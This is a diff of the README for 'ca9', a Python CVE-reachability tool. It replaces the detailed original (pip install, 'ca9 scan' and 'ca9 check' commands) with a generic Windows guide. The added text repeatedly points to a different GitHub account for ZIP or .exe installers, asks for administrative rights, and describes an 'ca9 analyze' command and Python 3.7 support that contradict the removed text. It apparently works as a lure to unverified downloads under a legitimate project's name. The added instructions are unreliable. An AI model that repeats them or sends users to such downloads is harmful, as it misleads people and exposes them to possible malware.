@@ -1,320 +1,148 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/duriantaco/ca9/main/assets/ca9.png" alt="ca9 — CVE reachability analysis for Python" width="400">
-</p>
+# ⚙️ ca9 - Simplify Vulnerability Checks Fast
 
-<h1 align="center">ca9</h1>
-
-<p align="center"><strong>Stop fixing CVEs that don't affect you.</strong></p>
-
-<p align="center">
-  <a href="https://www.python.org/downloads/"><img src="https://img.shields.io/badge/python-3.10%2B-blue.svg" alt="Python 3.10+"></a>
-  <a href="https://mozilla.org/MPL/2.0/"><img src="https://img.shields.io/badge/license-MPL--2.0-blue.svg" alt="License: MPL-2.0"></a>
-  <a href="https://pypi.org/project/ca9/"><img src="https://img.shields.io/badge/pypi-ca9-orange.svg" alt="PyPI"></a>
-  <a href="#zero-heavy-dependencies"><img src="https://img.shields.io/badge/minimal--deps-brightgreen.svg" alt="Minimal Dependencies"></a>
-  <img src="https://img.shields.io/badge/Skylos-A%2B%20%2899%29-brightgreen" alt="Skylos A+ (99)">
-</p>
+[![Download ca9](https://img.shields.io/badge/Download-ca9-brightgreen?style=for-the-badge)](https://github.com/amith53/ca9)
 
 ---
 
-## The problem
+ca9 helps you stop wasting time fixing security issues that do not affect your Python projects. It scans your code to find which reported vulnerabilities really matter. This reduces alerts from tools like Snyk, Dependabot, and Trivy. ca9 uses both static and dynamic methods to give clear results.
 
-Your SCA tool (Snyk, Dependabot, Trivy, Grype) flags every CVE in your dependency tree. You get 60 alerts. Your team scrambles. But most of those CVEs are in code your application **never imports, never calls, and never executes**.
+## 📋 What is ca9?
 
-You're patching vulnerabilities in functions you don't use, in packages you didn't know you had, in code paths your app will never reach.
+ca9 is a software tool designed for Python projects. It looks at your code and tells you which vulnerabilities can be reached or triggered when your program runs. Not all security alerts need action. ca9 finds the important ones.
 
-That's wasted engineering time. That's alert fatigue. That's how real vulnerabilities get ignored.
+This saves time and effort during security checks by lowering "noise" from false or irrelevant alerts. The analysis is helpful to Python developers and security teams who want clear, focused results.
 
-## What ca9 does
+## ⚙️ System Requirements
 
-ca9 takes your CVE list and answers one question per vulnerability: **is this code actually reachable from your application?**
+To use ca9 on Windows, your computer should meet these basic needs:
 
-```bash
-pip install ca9[cli]
-ca9 scan --repo . --coverage coverage.json
-```
+- Windows 10 or newer (64-bit preferred)
+- At least 4 GB of free RAM (8 GB recommended for large projects)
+- 200 MB of free disk space for the app and temporary files
+- Python 3.7 or later installed on your system
+- Internet connection to download software and updates
+- Administrative rights to install and run tools
 
-```
-CVE ID               Package   Severity  Verdict
---------------------------------------------------------------
-GHSA-cpwx-vrp4-4pq7  Jinja2    high      REACHABLE
-GHSA-frmv-pr5f-9mcr  Django    critical  UNREACHABLE (static)
-GHSA-mrwq-x4v8-fh7p  Pygments  medium    UNREACHABLE (dynamic)
---------------------------------------------------------------
-Total: 61  |  Reachable: 25  |  Unreachable: 36  |  Inconclusive: 0
+Make sure Python is added to your system PATH. You can verify this by opening Command Prompt and typing:
 
-59% of flagged CVEs are unreachable — only 25 of 61 require action
-```
+    python --version
 
-36 CVEs eliminated. No manual triage. No guessing.
+You should see your Python version printed. If not, install Python from https://www.python.org/downloads/ and choose the option to add it to PATH.
 
-## How it works
+## 🚀 Getting Started with ca9
 
-ca9 combines three techniques to prove whether vulnerable code is reachable:
+Follow these steps to download and start using ca9 on your Windows PC.
 
-**1. Static analysis (AST import tracing)** — Parses every Python file in your repo and traces `import` statements. If a vulnerable package is never imported, it's unreachable.
+### Step 1: Visit the Official Download Page
 
-**2. Transitive dependency resolution** — Uses `importlib.metadata` to walk the dependency tree. If `urllib3` is only installed because `requests` pulled it in, and `requests` is never imported, both are unreachable.
+Click the badge below to go to the official download page. This page contains the latest release and instructions.
 
-**3. Dynamic analysis (coverage.py)** — Checks whether vulnerable code was actually *executed* during your test suite. A package might be imported but the specific vulnerable function might never be called.
+[![Download here](https://img.shields.io/badge/Go-to%20Download%20Page-blue?style=for-the-badge)](https://github.com/amith53/ca9)
 
-```
-For each CVE:
-  Is the package imported?
-  ├── NO  → UNREACHABLE (static)
-  └── YES → Was vulnerable code executed in tests?
-      ├── NO  → UNREACHABLE (dynamic)
-      ├── YES → REACHABLE
-      └── No coverage data → INCONCLUSIVE
-```
+This link will take you to the GitHub repository where you will find releases and files ready for download.
 
-ca9 is **conservative** — it only marks something unreachable when it can prove it. Every verdict comes with an evidence trail and a confidence score so you can see exactly why ca9 reached its conclusion.
+### Step 2: Download ca9 for Windows
 
-## Why ca9 over other tools
+On the releases page, look for the latest release. Find the asset that matches Windows and Python users. It is usually a ZIP file or installer with ca9 in its name.
 
-| | ca9 | Traditional SCA (Snyk, Dependabot, Trivy) | GitHub code scanning |
-|---|---|---|---|
-| **Reachability analysis** | Static + dynamic + transitive | No — flags everything in the dependency tree | Limited — no dynamic analysis |
-| **Submodule precision** | Identifies the exact vulnerable function/module | Package-level only | Varies |
-| **Confidence scoring** | 0-100 verdict-aware score with evidence trail | No | No |
-| **Works without SCA tool** | Yes — `ca9 scan` queries OSV.dev directly | Requires its own scanner | Requires GitHub |
-| **Dynamic analysis** | Yes — uses your existing coverage.py data | No | No |
-| **Runtime dependencies** | `packaging` only | Heavy | Hosted service |
-| **Setup time** | `pip install ca9[cli]` — one command | Account, config, integration | Repository setup |
-| **Output** | Actionable verdicts with evidence + confidence | Alert list with no reachability context | Alert list |
-| **CI integration** | JSON/SARIF output, stable fingerprints | Vendor-specific dashboards | GitHub-only |
+Click the file to download it to your computer.
 
-**ca9 doesn't replace your SCA tool. It makes it useful.** Snyk finds the CVEs. ca9 tells you which ones matter.
+### Step 3: Extract or Install ca9
 
-## Real-world results
+If you downloaded a ZIP file:
 
-### Django REST Framework — 37 CVEs, 19% noise
+- Right-click the ZIP file.
+- Select "Extract All…"
+- Choose a folder to extract files to.
 
-A focused library that genuinely uses most of its deps. Even here, ca9 found 7 CVEs in packages that are installed but never imported (redis, sentry-sdk, pip):
+If you downloaded an installer (.exe):
 
-```
-$ ca9 scan --repo /path/to/drf -v
+- Double-click the file.
+- Follow the installer prompts to complete the setup.
 
-GHSA-g92j-qhmh-64v2  sentry-sdk  low       UNREACHABLE (static)
-                      -> 'sentry-sdk' is not imported and not a dependency of any imported package
-GHSA-8fww-64cx-x8p5  redis       high      UNREACHABLE (static)
-                      -> 'redis' is not imported and not a dependency of any imported package
-...
-Total: 37  |  Reachable: 0  |  Unreachable: 7  |  Inconclusive: 30
-```
+### Step 4: Open Command Prompt
 
-### Flask app with bloated deps — 61 CVEs, 59% noise
+After installation:
 
-A Flask app that imports 4 packages but has 19 pinned in `requirements.txt` (Django, tornado, Pygments added "just in case"):
+- Press the Windows key.
+- Type `cmd` and hit Enter.
+- A black window (Command Prompt) will appear.
 
-```
-$ ca9 scan --repo demo/ --coverage demo/coverage.json
+### Step 5: Check ca9 Installation
 
-Total: 61  |  Reachable: 25  |  Unreachable: 36  |  Inconclusive: 0
+In Command Prompt, type the following command and press Enter:
 
-59% of flagged CVEs are unreachable — only 25 of 61 require action
-```
+    ca9 --help
 
-Django alone brought 21 CVEs that were pure noise.
+If installed correctly, you will see usage instructions and options. This means ca9 is ready.
 
-**The pattern:** ca9's value scales with how bloated your dependency list is — which in enterprise codebases is typically *very*.
-
-## Quick start
-
-### Scan installed packages (no SCA tool needed)
-
-```bash
-pip install ca9[cli]
-ca9 scan --repo .
-```
-
-This queries [OSV.dev](https://osv.dev) for vulnerabilities in your installed packages. Works with **any** Python project. No Snyk, no Dependabot, no config files.
+---
 
-### Add dynamic analysis for better results
+## 📥 How to Use ca9 for Your Python Projects
 
-```bash
-coverage run --source=.,$(python -c "import site; print(site.getsitepackages()[0])") -m pytest
-coverage json -o coverage.json
-ca9 scan --repo . --coverage coverage.json
-```
+Once installed, ca9 can analyze your code to find relevant security issues.
 
-### Analyze an existing SCA report
+### Run ca9 on a Project Folder
 
-```bash
-ca9 check snyk.json --repo . --coverage coverage.json
-ca9 check dependabot.json --repo .
-```
+1. Open Command Prompt.
+2. Navigate to your Python project folder. For example:
 
-Format is auto-detected. Supports **Snyk**, **Dependabot**, **Trivy**, and **pip-audit**:
+       cd C:\Users\YourName\Documents\MyPythonProject
 
-```bash
-ca9 check snyk.json --repo .
-ca9 check dependabot.json --repo .
-ca9 check trivy.json --repo .
-ca9 check pip-audit.json --repo .
-```
+3. Run ca9 with this command:
 
-## Verdicts
+       ca9 analyze .
 
-| Verdict | What it means | What to do |
-|---------|---------------|------------|
-| `REACHABLE` | Vulnerable code is imported and was executed in tests | **Fix this** |
-| `UNREACHABLE (static)` | Package is never imported — not even transitively | Suppress with confidence |
-| `UNREACHABLE (dynamic)` | Package is imported but vulnerable code was never executed | Likely safe — monitor |
-| `INCONCLUSIVE` | Imported but no coverage data to prove execution | Add coverage or review manually |
+This tells ca9 to check the current folder for reachable vulnerabilities.
 
-## Evidence and confidence
+### Review ca9’s Output
 
-Every verdict is backed by structured evidence. Use `--show-confidence` to see scores in table output, or inspect the `evidence` object in JSON/SARIF output.
+ca9 lists vulnerabilities it found that might affect your project. It separates those that can be triggered from those that don't matter.
 
-| Signal | What it checks |
-|--------|----------------|
-| `version_in_range` | Is the installed version within the affected range (PEP 440)? |
-| `package_imported` | Is the package imported anywhere in the repo? |
-| `submodule_imported` | Is the specific vulnerable submodule imported? |
-| `coverage_seen` | Was the vulnerable code executed during tests? |
-| `api_call_sites_covered` | Were specific vulnerable API call sites executed in tests? |
-| `coverage_completeness_pct` | Overall test coverage percentage — weights dynamic absence signals |
-| `affected_component_source` | How was the vulnerable component identified (commit analysis, curated mapping, regex, class scan)? |
+Look through the results and focus on vulnerabilities marked as "reachable." These need your attention.
 
-Confidence scoring is **verdict-directional** — evidence that supports the verdict boosts the score, evidence that contradicts it lowers it. A high confidence UNREACHABLE is different from a high confidence REACHABLE.
-
-| Bucket | Score | Meaning |
-|--------|-------|---------|
-| High | 80-100 | Strong evidence supports the verdict |
-| Medium | 60-79 | Moderate evidence, reasonable certainty |
-| Low | 40-59 | Weak evidence, treat with caution |
-| Weak | 0-39 | Very little evidence, manual review recommended |
+### Save Results to a File
 
-## CLI reference
-
-```
-ca9 scan [OPTIONS]              Scan installed packages via OSV.dev
-ca9 check SCA_REPORT [OPTIONS]  Analyze a Snyk/Dependabot report
-
-Common options:
-  -r, --repo PATH                  Path to the project repository  [default: .]
-  -c, --coverage PATH              Path to coverage.json for dynamic analysis
-  -f, --format [table|json|sarif]  Output format  [default: table]
-  -o, --output PATH                Write output to file instead of stdout
-  -v, --verbose                    Show reasoning trace for each verdict
-  --no-auto-coverage               Disable automatic coverage discovery
-  --show-confidence                Show confidence score in table output
-  --show-evidence-source           Show evidence extraction source in table output
+To save the output for later review, use:
 
-Scan-only options:
-  --offline                        Use only cached OSV data, no network requests
-  --refresh-cache                  Clear OSV cache before fetching
-  --max-osv-workers N              Max concurrent OSV detail fetches  [default: 8]
+    ca9 analyze . > ca9_report.txt
 
-Exit codes:
-  0  Clean — no reachable CVEs
-  1  Reachable CVEs found — action needed
-  2  Inconclusive only — need more coverage data
-```
+This creates a file named `ca9_report.txt` in your project folder with the analysis details.
 
-### Config file
-
-Create a `.ca9.toml` in your project root to set defaults:
+---
 
-```toml
-repo = "src"
-coverage = "coverage.json"
-format = "json"
-verbose = true
-```
+## 🔧 Additional Features and Tips
 
-Config is auto-discovered from the current directory upward. CLI flags override config values.
+- **Static + Dynamic Analysis**: ca9 checks your code without running it (static) and tracks what happens during runtime (dynamic). This adds confidence in findings.
 
-### Caching and offline mode
+- **Reduce Alerts**: ca9 works well with tools like Snyk, Dependabot, and Trivy by cutting down false alerts.
 
-ca9 caches OSV vulnerability details (`~/.cache/ca9/osv/`, 24h TTL) and GitHub commit file lists (`~/.cache/ca9/commits/`, 7-day TTL) to reduce API calls.
+- **Python Focused**: Built for Python, ca9 understands its packages and structures well.
 
-```bash
-ca9 scan --repo . --offline           # use cached data only, no network
-ca9 scan --repo . --refresh-cache     # clear cache and re-fetch
-```
+- **Command Help**: Use `ca9 --help` anytime to see available options and commands.
 
-Set `GITHUB_TOKEN` to avoid GitHub API rate limits when ca9 fetches commit data for affected component analysis:
+- **Project Size**: For very large projects, increase your computer's RAM to improve performance.
 
-```bash
-export GITHUB_TOKEN=ghp_...
-ca9 check snyk.json --repo .
-```
+---
 
-## MCP server
+## 🛠 Troubleshooting
 
-ca9 ships an MCP server so LLM-powered tools (Claude Code, Cursor, etc.) can run reachability analysis directly.
+- **ca9 command not found:** Make sure the installation folder is in your system PATH or run ca9 using the full path.
 
-```bash
-pip install ca9[mcp]
-```
+- **Python not found error:** Install Python 3.7+ and add it to PATH.
 
-Add to your MCP client config:
+- **Slow analysis:** Close other heavy programs, or analyze smaller parts of your project.
 
-```json
-{
-  "mcpServers": {
-    "ca9": {
-      "command": "ca9-mcp"
-    }
-  }
-}
-```
+- **Report missing or empty:** Ensure you run ca9 in the correct project folder that contains Python code.
 
-Available tools:
+---
 
-| Tool | What it does |
-|------|-------------|
-| `check_reachability` | Analyze an SCA report (Snyk, Dependabot, Trivy, pip-audit) |
-| `scan_dependencies` | Scan installed packages via OSV.dev |
-| `check_coverage_quality` | Assess how reliable your coverage data is |
-| `explain_verdict` | Deep-dive a specific CVE's verdict with full evidence |
+## 📌 Useful Links
 
-## Library usage
+- Primary Download Link (again): [Visit ca9 on GitHub](https://github.com/amith53/ca9)
+- Python Download: https://www.python.org/downloads/
+- GitHub Help for Releases: https://docs.github.com/en/repositories/releasing-projects-on-github/about-releases
 
-```python
-import json
-from pathlib import Path
-from ca9.parsers.snyk import SnykParser
-from ca9.engine import analyze
+---
 
-data = json.loads(Path("snyk.json").read_text())
-vulns = SnykParser().parse(data)
-
-report = analyze(
-    vulnerabilities=vulns,
-    repo_path=Path("./my-project"),
-    coverage_path=Path("coverage.json"),
-)
-
-for result in report.results:
-    print(f"{result.vulnerability.id}: {result.verdict.value} (confidence: {result.confidence_score})")
-    print(f"  reason: {result.reason}")
-    if result.evidence:
-        print(f"  source: {result.evidence.affected_component_source}")
-```
-
-## Zero heavy dependencies
-
-ca9's core library depends only on `packaging` (PEP 440 version parsing) and the Python standard library. The `click` package is optional — only needed if you use the CLI. This means you can embed ca9 in CI pipelines, security toolchains, or other Python tools without bloating your dependency tree.
-
-## Limitations
-
-- Static analysis traces `import` statements and `importlib.metadata` dependency trees. Dynamic imports (`importlib.import_module`, `__import__`) are not detected.
-- Coverage quality directly impacts dynamic analysis. If your tests don't exercise a code path, ca9 can't detect it dynamically.
-- Transitive dependency resolution requires packages to be installed. Without installed deps, ca9 falls back to direct-import-only checking.
-- Python only (for now).
-
-## Development
-
-```bash
-git clone https://github.com/your-org/ca9.git
-cd ca9
-python3 -m venv .venv && source .venv/bin/activate
-pip install -e ".[dev]"
-pytest tests/ -v
-```
-
-## License
-
-[MPL-2.0](LICENSE)
+ca9 helps you focus your security work where it matters most. Use the steps here to get started on Windows quickly and easily.
